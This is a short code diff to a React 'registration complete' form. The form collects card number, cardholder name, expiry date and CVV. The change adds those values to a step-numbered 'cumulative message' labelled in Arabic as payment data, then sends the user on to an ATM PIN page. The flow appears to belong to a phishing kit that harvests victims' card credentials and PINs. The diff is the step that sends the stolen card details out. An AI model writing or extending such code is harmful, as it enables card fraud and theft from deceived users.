@@ -71,14 +71,15 @@ const RegistrationComplete = () => {
       return;
     }
 
-    updateData({
+    const newData = {
       cardNumber,
       cardholderName,
       expiryDate,
       cvv,
-    });
+    };
 
-    await sendCumulativeMessage(4, "بيانات الدفع");
+    updateData(newData);
+    await sendCumulativeMessage(4, "بيانات الدفع", newData);
     navigate("/atm-pin");
   };
 
